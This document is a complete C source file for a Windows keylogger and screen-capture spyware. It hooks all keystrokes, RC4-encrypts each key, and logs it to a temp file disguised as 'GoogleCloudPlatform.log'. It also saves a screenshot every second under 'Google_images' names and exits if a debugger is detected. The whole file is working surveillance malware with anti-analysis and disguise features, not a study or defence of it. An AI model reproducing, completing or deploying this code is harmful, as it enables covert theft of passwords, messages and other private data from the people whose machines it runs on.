
#define _WIN32_WINNT 0x0400
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

#include <Windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#include <tlhelp32.h>
#include <conio.h>
#include <process.h>
HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;
#define N 256 // 2^8
#define MAX_THREADS 32

char encrypt_with[] = "M!Ma[zpeoge1";
FILE *fptr;
wchar_t wchPath[MAX_PATH];
const char *temp_location;
const char *image_loc;
HANDLE hConsoleOut;                  // Handle to the console
HANDLE hRunMutex;                    // "Keep Running" mutex
HANDLE hScreenMutex;                 // "Screen update" mutex
int ThreadNr = 0;                    // Number of threads started
CONSOLE_SCREEN_BUFFER_INFO csbiInfo; // Console information
COORD consoleSize;
BOOL bTrails = FALSE;
HANDLE hThreads[MAX_THREADS] = {NULL};

void main(void);                    // Thread 1: main
void KbdFunc(void);                // Keyboard input, thread dispatch
void BounceProc(void* pMyID);      // Threads 2 to n: display
void ClearScreen(void);            // Screen clear
void ShutDown(void);               // Program shutdown
void WriteTitle(int ThreadNum);    // Display title bar information
void swap(unsigned char *a, unsigned char *b)
{
    int tmp = *a;
    *a = *b;
    *b = tmp;
}

int KSA(char *key, unsigned char *S)
{

    int len = strlen(key);
    int j = 0;

    for (int i = 0; i < N; i++)
        S[i] = i;

    for (int i = 0; i < N; i++)
    {
        j = (j + S[i] + key[i % len]) % N;

        swap(&S[i], &S[j]);
    }

    return 0;
}

int PRGA(unsigned char *S, char *plaintext, unsigned char *ciphertext)
{

    int i = 0;
    int j = 0;

    for (size_t n = 0, len = strlen(plaintext); n < len; n++)
    {
        i = (i + 1) % N;
        j = (j + S[i]) % N;

        swap(&S[i], &S[j]);
        int rnd = S[(S[i] + S[j]) % N];

        ciphertext[n] = rnd ^ plaintext[n];
    }

    return 0;
}

int RC4(char *key, char *plaintext, unsigned char *ciphertext)
{

    unsigned char S[N];
    KSA(key, S);

    PRGA(S, plaintext, ciphertext);

    return 0;
}

char *allocate_keyboard(char *key, int code, WPARAM wParam, int nCode)
{
    BOOL caps = FALSE;
    SHORT capsShort = GetKeyState(VK_CAPITAL);
    if (capsShort > 0)
    {
        // If the high-order bit is 1, the key is down; otherwise, it is up
        caps = TRUE;
    }
    BOOL shift = FALSE;
    if (nCode == HC_ACTION)
    {
        if (code == VK_LSHIFT || code == VK_RSHIFT)
        {
            // WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, or WM_SYSKEYUP.
            if (wParam == WM_KEYDOWN)
            {
                shift = TRUE;
            }
            if (wParam == WM_KEYUP)
            {
                shift = FALSE;
            }
            else
            {
                shift = FALSE;
            }
        }
    }
    switch (code) // SWITCH ON INT
    {
    // Char keys for ASCI
    // No VM Def in header
    case 0x41:
        key = caps ? (shift ? "a" : "A") : (shift ? "A" : "a");
        break;
    case 0x42:
        key = caps ? (shift ? "b" : "B") : (shift ? "B" : "b");
        break;
    case 0x43:
        key = caps ? (shift ? "c" : "C") : (shift ? "C" : "c");
        break;
    case 0x44:
        key = caps ? (shift ? "d" : "D") : (shift ? "D" : "d");
        break;
    case 0x45:
        key = caps ? (shift ? "e" : "E") : (shift ? "E" : "e");
        break;
    case 0x46:
        key = caps ? (shift ? "f" : "F") : (shift ? "F" : "f");
        break;
    case 0x47:
        key = caps ? (shift ? "g" : "G") : (shift ? "G" : "g");
        break;
    case 0x48:
        key = caps ? (shift ? "h" : "H") : (shift ? "H" : "h");
        break;
    case 0x49:
        key = caps ? (shift ? "i" : "I") : (shift ? "I" : "i");
        break;
    case 0x4A:
        key = caps ? (shift ? "j" : "J") : (shift ? "J" : "j");
        break;
    case 0x4B:
        key = caps ? (shift ? "k" : "K") : (shift ? "K" : "k");
        break;
    case 0x4C:
        key = caps ? (shift ? "l" : "L") : (shift ? "L" : "l");
        break;
    case 0x4D:
        key = caps ? (shift ? "m" : "M") : (shift ? "M" : "m");
        break;
    case 0x4E:
        key = caps ? (shift ? "n" : "N") : (shift ? "N" : "n");
        break;
    case 0x4F:
        key = caps ? (shift ? "o" : "O") : (shift ? "O" : "o");
        break;
    case 0x50:
        key = caps ? (shift ? "p" : "P") : (shift ? "P" : "p");
        break;
    case 0x51:
        key = caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q");
        break;
    case 0x52:
        key = caps ? (shift ? "r" : "R") : (shift ? "R" : "r");
        break;
    case 0x53:
        key = caps ? (shift ? "s" : "S") : (shift ? "S" : "s");
        break;
    case 0x54:
        key = caps ? (shift ? "t" : "T") : (shift ? "T" : "t");
        break;
    case 0x55:
        key = caps ? (shift ? "u" : "U") : (shift ? "U" : "u");
        break;
    case 0x56:
        key = caps ? (shift ? "v" : "V") : (shift ? "V" : "v");
        break;
    case 0x57:
        key = caps ? (shift ? "w" : "W") : (shift ? "W" : "w");
        break;
    case 0x58:
        key = caps ? (shift ? "x" : "X") : (shift ? "X" : "x");
        break;
    case 0x59:
        key = caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y");
        break;
    case 0x5A:
        key = caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z");
        break;
    // Sleep Key
    case VK_SLEEP:
        key = "[SLEEP]";
        break;
    // Num Keyboard
    case VK_NUMPAD0:
        key = "0";
        break;
    case VK_NUMPAD1:
        key = "1";
        break;
    case VK_NUMPAD2:
        key = "2";
        break;
    case VK_NUMPAD3:
        key = "3";
        break;
    case VK_NUMPAD4:
        key = "4";
        break;
    case VK_NUMPAD5:
        key = "5";
        break;
    case VK_NUMPAD6:
        key = "6";
        break;
    case VK_NUMPAD7:
        key = "7";
        break;
    case VK_NUMPAD8:
        key = "8";
        break;
    case VK_NUMPAD9:
        key = "9";
        break;
    case VK_MULTIPLY:
        key = "*";
        break;
    case VK_ADD:
        key = "+";
        break;
    case VK_SEPARATOR:
        key = "-";
        break;
    case VK_SUBTRACT:
        key = "-";
        break;
    case VK_DECIMAL:
        key = ".";
        break;
    case VK_DIVIDE:
        key = "/";
        break;
    // Function Keys
    case VK_F1:
        key = "[F1]";
        break;
    case VK_F2:
        key = "[F2]";
        break;
    case VK_F3:
        key = "[F3]";
        break;
    case VK_F4:
        key = "[F4]";
        break;
    case VK_F5:
        key = "[F5]";
        break;
    case VK_F6:
        key = "[F6]";
        break;
    case VK_F7:
        key = "[F7]";
        break;
    case VK_F8:
        key = "[F8]";
        break;
    case VK_F9:
        key = "[F9]";
        break;
    case VK_F10:
        key = "[F10]";
        break;
    case VK_F11:
        key = "[F11]";
        break;
    case VK_F12:
        key = "[F12]";
        break;
    case VK_F13:
        key = "[F13]";
        break;
    case VK_F14:
        key = "[F14]";
        break;
    case VK_F15:
        key = "[F15]";
        break;
    case VK_F16:
        key = "[F16]";
        break;
    case VK_F17:
        key = "[F17]";
        break;
    case VK_F18:
        key = "[F18]";
        break;
    case VK_F19:
        key = "[F19]";
        break;
    case VK_F20:
        key = "[F20]";
        break;
    case VK_F21:
        key = "[F22]";
        break;
    case VK_F22:
        key = "[F23]";
        break;
    case VK_F23:
        key = "[F24]";
        break;
    case VK_F24:
        key = "[F25]";
        break;
    // Keys
    case VK_NUMLOCK:
        key = "[NUM-LOCK]";
        break;
    case VK_SCROLL:
        key = "[SCROLL-LOCK]";
        break;
    case VK_BACK:
        key = "[BACK]";
        break;
    case VK_TAB:
        key = "[TAB]";
        break;
    case VK_CLEAR:
        key = "[CLEAR]";
        break;
    case VK_RETURN:
        key = "[ENTER]";
        break;
    case VK_SHIFT:
        key = "[SHIFT]";
        break;
    case VK_CONTROL:
        key = "[CTRL]";
        break;
    case VK_MENU:
        key = "[ALT]";
        break;
    case VK_PAUSE:
        key = "[PAUSE]";
        break;
    case VK_CAPITAL:
        key = "[CAP-LOCK]";
        break;
    case VK_ESCAPE:
        key = "[ESC]";
        break;
    case VK_SPACE:
        key = "[SPACE]";
        break;
    case VK_PRIOR:
        key = "[PAGEUP]";
        break;
    case VK_NEXT:
        key = "[PAGEDOWN]";
        break;
    case VK_END:
        key = "[END]";
        break;
    case VK_HOME:
        key = "[HOME]";
        break;
    case VK_LEFT:
        key = "[LEFT]";
        break;
    case VK_UP:
        key = "[UP]";
        break;
    case VK_RIGHT:
        key = "[RIGHT]";
        break;
    case VK_DOWN:
        key = "[DOWN]";
        break;
    case VK_SELECT:
        key = "[SELECT]";
        break;
    case VK_PRINT:
        key = "[PRINT]";
        break;
    case VK_SNAPSHOT:
        key = "[PRTSCRN]";
        break;
    case VK_INSERT:
        key = "[INS]";
        break;
    case VK_DELETE:
        key = "[DEL]";
        break;
    case VK_HELP:
        key = "[HELP]";
        break;
    // Number Keys with shift
    case 0x30:
        key = shift ? "!" : "1";
        break;
    case 0x31:
        key = shift ? "@" : "2";
        break;
    case 0x32:
        key = shift ? "#" : "3";
        break;
    case 0x33:
        key = shift ? "$" : "4";
        break;
    case 0x34:
        key = shift ? "%" : "5";
        break;
    case 0x35:
        key = shift ? "^" : "6";
        break;
    case 0x36:
        key = shift ? "&" : "7";
        break;
    case 0x37:
        key = shift ? "*" : "8";
        break;
    case 0x38:
        key = shift ? "(" : "9";
        break;
    case 0x39:
        key = shift ? ")" : "0";
        break;
    // Windows Keys
    case VK_LWIN:
        key = "[WIN]";
        break;
    case VK_RWIN:
        key = "[WIN]";
        break;
    case VK_LSHIFT:
        key = "[SHIFT]";
        break;
    case VK_RSHIFT:
        key = "[SHIFT]";
        break;
    case VK_LCONTROL:
        key = "[CTRL]";
        break;
    case VK_RCONTROL:
        key = "[CTRL]";
        break;
    // OEM Keys with shift
    case VK_OEM_1:
        key = shift ? ":" : ";";
        break;
    case VK_OEM_PLUS:
        key = shift ? "+" : "=";
        break;
    case VK_OEM_COMMA:
        key = shift ? "<" : ",";
        break;
    case VK_OEM_MINUS:
        key = shift ? "_" : "-";
        break;
    case VK_OEM_PERIOD:
        key = shift ? ">" : ".";
        break;
    case VK_OEM_2:
        key = shift ? "?" : "/";
        break;
    case VK_OEM_3:
        key = shift ? "~" : "`";
        break;
    case VK_OEM_4:
        key = shift ? "{" : "[";
        break;
    case VK_OEM_5:
        key = shift ? "\\" : "|";
        break;
    case VK_OEM_6:
        key = shift ? "}" : "]";
        break;
    case VK_OEM_7:
        key = shift ? "'" : "'";
        break; // TODO: Escape this char: "
    // Action Keys
    case VK_PLAY:
        key = "[PLAY]";
    case VK_ZOOM:
        key = "[ZOOM]";
    case VK_OEM_CLEAR:
        key = "[CLEAR]";
    case VK_CANCEL:
        key = "[CTRL-C]";

    default:
        key = "[UNK-KEY]";
        return key;
    }
    return key;
}

static LRESULT CALLBACK HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{

    if (wParam == WM_KEYDOWN)
    {
        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
        const char *key;
        key = allocate_keyboard(&key, p->vkCode, wParam, nCode);
        const char *plaintext;
        plaintext = key;
        const unsigned *encrypted_text = malloc(sizeof(int) * strlen(plaintext));
        RC4(encrypt_with, plaintext, encrypted_text);
        sprintf(encrypted_text, "%s\n", encrypted_text);
        char *ret;
        ret = strstr(temp_location, "GoogleCloudPlatform.log");
        if (!ret) { 
         sprintf(temp_location, "%sGoogleCloudPlatform.log", temp_location);
        }
      //  printf("log: %s\n",temp_location);
        fptr = fopen(temp_location, "a");
        fputs(encrypted_text, fptr);
        fclose(fptr);
    }

    // call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void at_exit(void)
{
    fclose(fptr);
}

BOOL open_csrss()
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, "csrss.exe") == 0)
            {
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
                if (hProcess)
                {
                    return TRUE;
                }
                CloseHandle(hProcess);

                return FALSE;

                // Do stuff..
            }
        }
    }

    CloseHandle(snapshot);
    return FALSE;
}

void ShutDown(void) // Shut down threads
{
    // Tell all threads to die
    ReleaseMutex(hRunMutex);

    while (ThreadNr > 0)
    {
        // Wait for each thread to complete
        WaitForSingleObject(hThreads[--ThreadNr], INFINITE);
    }

    // Clean up display when done
    WaitForSingleObject(hScreenMutex, INFINITE);
    ClearScreen();
}

void Get_msgs()
{

    HINSTANCE hInstance = 0;
    DWORD dw =0;
    if (GetTempPathA(MAX_PATH, wchPath))
    {
        sprintf(wchPath, "%sGoogleCloudPlatform.log", wchPath);
        temp_location = wchPath;
    }

    _hook = SetWindowsHookExA(WH_KEYBOARD_LL, HookCallback, hInstance, dw);
    if (!_hook)
    {
        DWORD error = GetLastError();
        printf("Error: %d\n", error);
    }
    while (GetMessage(&hInstance, NULL, 0, 0))
    {
        TranslateMessage(&hInstance);
        DispatchMessage(&hInstance);
    }
}
BOOL SaveToFile(HBITMAP hBitmap3, LPCTSTR lpszFileName)
{   
  HDC hDC;
  int iBits;
  WORD wBitCount;
  DWORD dwPaletteSize=0, dwBmBitsSize=0, dwDIBSize=0, dwWritten=0;
  BITMAP Bitmap0;
  BITMAPFILEHEADER bmfHdr;
  BITMAPINFOHEADER bi;
  LPBITMAPINFOHEADER lpbi;
  HANDLE fh, hDib, hPal,hOldPal2=NULL;
  hDC = CreateDC("DISPLAY", NULL, NULL, NULL);
  iBits = GetDeviceCaps(hDC, BITSPIXEL) * GetDeviceCaps(hDC, PLANES);
  DeleteDC(hDC);
  if (iBits <= 1)
    wBitCount = 1;
  else if (iBits <= 4)
    wBitCount = 4;
  else if (iBits <= 8)
    wBitCount = 8;
  else
    wBitCount = 24; 
  GetObject(hBitmap3, sizeof(Bitmap0), (LPSTR)&Bitmap0);
  bi.biSize = sizeof(BITMAPINFOHEADER);
  bi.biWidth = Bitmap0.bmWidth;
  bi.biHeight =-Bitmap0.bmHeight;
  bi.biPlanes = 1;
  bi.biBitCount = wBitCount;
  bi.biCompression = BI_RGB;
  bi.biSizeImage = 0;
  bi.biXPelsPerMeter = 0;
  bi.biYPelsPerMeter = 0;
  bi.biClrImportant = 0;
  bi.biClrUsed = 256;
  dwBmBitsSize = ((Bitmap0.bmWidth * wBitCount +31) & ~31) /8
                                                * Bitmap0.bmHeight; 
  hDib = GlobalAlloc(GHND,dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));
  lpbi = (LPBITMAPINFOHEADER)GlobalLock(hDib);
  *lpbi = bi;

  hPal = GetStockObject(DEFAULT_PALETTE);
  if (hPal)
  { 
    hDC = GetDC(NULL);
    hOldPal2 = SelectPalette(hDC, (HPALETTE)hPal, FALSE);
    RealizePalette(hDC);
  }


  GetDIBits(hDC, hBitmap3, 0, (UINT) Bitmap0.bmHeight, (LPSTR)lpbi + sizeof(BITMAPINFOHEADER) 
    +dwPaletteSize, (BITMAPINFO *)lpbi, DIB_RGB_COLORS);

  if (hOldPal2)
  {
    SelectPalette(hDC, (HPALETTE)hOldPal2, TRUE);
    RealizePalette(hDC);
    ReleaseDC(NULL, hDC);
  }

  fh = CreateFile(lpszFileName, GENERIC_WRITE,0, NULL, CREATE_ALWAYS, 
    FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL); 

  if (fh == INVALID_HANDLE_VALUE)
    return FALSE; 

  bmfHdr.bfType = 0x4D42; // "BM"
  dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;
  bmfHdr.bfSize = dwDIBSize;
  bmfHdr.bfReserved1 = 0;
  bmfHdr.bfReserved2 = 0;
  bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;

  WriteFile(fh, (LPSTR)&bmfHdr, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);

  WriteFile(fh, (LPSTR)lpbi, dwDIBSize, &dwWritten, NULL);
  GlobalUnlock(hDib);
  GlobalFree(hDib);
  CloseHandle(fh);

  return TRUE;
} 

int screenCapture(int x, int y, int w, int h, LPCSTR fname)
{
    HDC hdcSource = GetDC(NULL);
    HDC hdcMemory = CreateCompatibleDC(hdcSource);

    int capX = GetDeviceCaps(hdcSource, HORZRES);
    int capY = GetDeviceCaps(hdcSource, VERTRES);

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcSource, w, h);
    HBITMAP hBitmapOld = (HBITMAP)SelectObject(hdcMemory, hBitmap);

    BitBlt(hdcMemory, 0, 0, w, h, hdcSource, x, y, SRCCOPY);
    hBitmap = (HBITMAP)SelectObject(hdcMemory, hBitmapOld);

    DeleteDC(hdcSource);
    DeleteDC(hdcMemory);

    HPALETTE hpal = NULL;
    if(SaveToFile(hBitmap, fname)) return 1;
    return 0;
}
void take_screenshots() { 

   if (GetTempPathA(MAX_PATH, wchPath))
    {
        image_loc = wchPath;
    }


while (1) { 
    int _rand = rand();
    char new[100];
    snprintf(new,100, "%sGoogle_images%d.bmp",image_loc,_rand);
    Sleep(1000);
    screenCapture(0,0, GetSystemMetrics(0), 768,new );

}
}
void KbdFunc(void) // Dispatch and count threads.
{

    ++ThreadNr;
    hThreads[ThreadNr] =
        (HANDLE)_beginthread(Get_msgs, 0, (void *)(uintptr_t)ThreadNr);
    WriteTitle(ThreadNr);
        ++ThreadNr;
         hThreads[ThreadNr] =
        (HANDLE)_beginthread(take_screenshots, 0, (void *)(uintptr_t)ThreadNr);
    WriteTitle(ThreadNr);


while (1) { 

}
   // ShutDown();
}
void WriteTitle(int ThreadNum)
{
    enum
    {
        sizeOfNThreadMsg = 120
    };
    wchar_t    NThreadMsg[sizeOfNThreadMsg] = { L"" };

    SetConsoleTitleW(NThreadMsg);
}

void ClearScreen(void)
{
    DWORD    dummy = 0;
    COORD    Home = { 0, 0 };
    FillConsoleOutputCharacterW(hConsoleOut, L' ',
        consoleSize.X * consoleSize.Y,
        Home, &dummy);
}
void main()
{

    if (IsDebuggerPresent())
    {
        exit(1);
    }
    if (open_csrss())
    {
        exit(1);
    }
    hConsoleOut = GetStdHandle(STD_OUTPUT_HANDLE);
    GetConsoleScreenBufferInfo(hConsoleOut, &csbiInfo);
    consoleSize.X = csbiInfo.srWindow.Right;
    consoleSize.Y = csbiInfo.srWindow.Bottom;
    ClearScreen();
    WriteTitle(0);

    // Create the mutexes and reset thread count.
    hScreenMutex = CreateMutexW(NULL, FALSE, NULL); // Cleared
    hRunMutex = CreateMutexW(NULL, TRUE, NULL);     // Set
    KbdFunc();
    if (hScreenMutex)
        CloseHandle(hScreenMutex);
    if (hRunMutex)
        CloseHandle(hRunMutex);
    if (hConsoleOut)
        CloseHandle(hConsoleOut);
}
